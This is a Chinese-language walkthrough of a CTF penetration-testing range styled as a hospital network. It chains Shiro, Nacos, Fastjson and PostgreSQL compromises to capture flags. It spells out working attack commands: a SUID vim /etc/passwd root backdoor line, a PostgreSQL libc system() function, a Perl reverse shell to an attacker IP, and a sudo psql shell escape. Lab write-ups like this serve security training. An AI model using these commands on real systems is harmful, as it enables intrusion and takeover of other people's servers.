![](attachments/Pasted%20image%2020240216130244.png)
#内网渗透 #Nacos #Shiro #Fastjson #Decrypt
在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。

nmap

![](attachments/Pasted%20image%2020240802145752.png)

访问8080端口服务

![](attachments/Pasted%20image%2020240802145947.png)

弱口令 admin:admin123

明显的shiro特征，但是爆破密钥无果

![](attachments/Pasted%20image%2020240802150516.png)

又用fscan扫了一遍

![](attachments/Pasted%20image%2020240802150757.png)

`actuator`泄露

拿下shirokey

![](attachments/Pasted%20image%2020240802151910.png)

```
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
```

工具直接执行命令

![](attachments/Pasted%20image%2020240802152045.png)

直接弹shell

`find / -user root -perm -4000 -print 2>/dev/null`

![](attachments/Pasted%20image%2020240802154503.png)

vim.basic 提权

直接利用vim.basic 向root中写自己的公钥然后ssh登录，也可以改写passwd文件增加已知密码的用户

`vim.basic /root/.ssh/authorized_keys` 
或者写/etc/passwd

```
$1$asd$sTMDZlRI6L.jJEw2I.3x8.:0:0:root:/toor:/bin/bash
密码 123
用户 toor
```

![](attachments/Pasted%20image%2020240803130627.png)

利用proxychain扫描
proxychains4 -q nxc smb 172.30.12.5/24


`scp "D:\web\scan\fscan\fscan" root@39.98.125.109:/root`

```

上传venom，配置socks代理并通过proxyfilter代理到本地
```

访问http://172.30.12.6:8848/nacos ，尝试默认密码 nacos:nacos


fscan扫描内网

```SH
root@web01:~# chmod 777 fscan
root@web01:~# ./fscan -h 172.30.12.5/24 -hn 172.30.12.5

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.30.12.236   is alive
(icmp) Target 172.30.12.6     is alive
[*] Icmp alive hosts len is: 2
172.30.12.236:8009 open
172.30.12.6:8848 open
172.30.12.236:8080 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.6:445 open
172.30.12.236:22 open
[*] alive ports len is: 7
start vulscan
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02
[*] NetInfo
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass

```

venom + proxyfilter 做socks代理 默认密码nacos:nacos

![](attachments/Pasted%20image%2020240807170211.png)

![](attachments/Pasted%20image%2020240807170050.png)

http://172.30.12.236:8080 FASTJSON 一把梭

![](attachments/Pasted%20image%2020240807162626.png)

哥斯拉直接就是root

![](attachments/Pasted%20image%2020240807163424.png)


vemon 连接  fscan扫描

```SHELL
root@web03:~# ./fscan -h 172.30.54.179/24 -hn 172.30.54.179
./fscan -h 172.30.54.179/24 -hn 172.30.54.179

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.30.54.12    is alive
[*] Icmp alive hosts len is: 1
172.30.54.12:3000 open
172.30.54.12:5432 open
172.30.54.12:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
```




PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件

- `/lib/x86_64-linux-gnu/libc.so.6`
- `/lib/libc.so.6`
- `/lib64/libc.so.6`
- `/usr/lib/x86_64-linux-gnu/libc.so.6`
- `/usr/lib32/libc.so.6`

perl弹shell

```SQL
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; select system('curl 172.30.54.179');

select system('perl -e \'use Socket;$i="172.30.54.179";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');

# 修改root用户密码
ALTER USER root WITH PASSWORD 'wuwumonster';
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


```SHELL
# 提权 在出现的信息下输入 !/bin/bash
sudo /usr/local/postgresql/bin/psql
root-# \?
General
  \c[onnect] [DBNAME|- [USER]]
                 connect to new database (currently "root")
  \cd [DIR]      change the current working directory
  \copyright     show PostgreSQL usage and distribution terms
  \encoding [ENCODING]
                 show or set client encoding
  \h [NAME]      help on syntax of SQL commands, * for all commands
  \q             quit psql
  \set [NAME [VALUE]]
                 set internal variable, or list all if no parameters
  \timing        toggle timing of commands (currently off)
  \unset NAME    unset (delete) internal variable
  \! [COMMAND]   execute command in shell or start interactive shell

Query Buffer
  \e [FILE]      edit the query buffer (or file) with external editor
  \g [FILE]      send query buffer to server (and results to file or |pipe)
  \p             show the contents of the query buffer
  \r             reset (clear) the query buffer
  \w FILE        write query buffer to file

Input/Output
!/bin/bash
```

```shell
root@web04:~/flag# cat flag04.txt
cat flag04.txt
                                           ,,                   ,,
`7MMF'  `7MMF'                             db   mm            `7MM
  MM      MM                                    MM              MM
  MM      MM  ,pW"Wq.  ,pP"Ybd `7MMpdMAo.`7MM mmMMmm  ,6"Yb.    MM
  MMmmmmmmMM 6W'   `Wb 8I   `"   MM   `Wb  MM   MM   8)   MM    MM
  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM
  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM
.JMML.  .JMML.`Ybmd9'  M9mmmP'   MMbmmd' .JMML. `Mbmo`Moo9^Yo..JMML.
                                 MM
                               .JMML.
flag04: flag{ea3f1322-93cf-43eb-a54b-e2ff6b8e396e}
```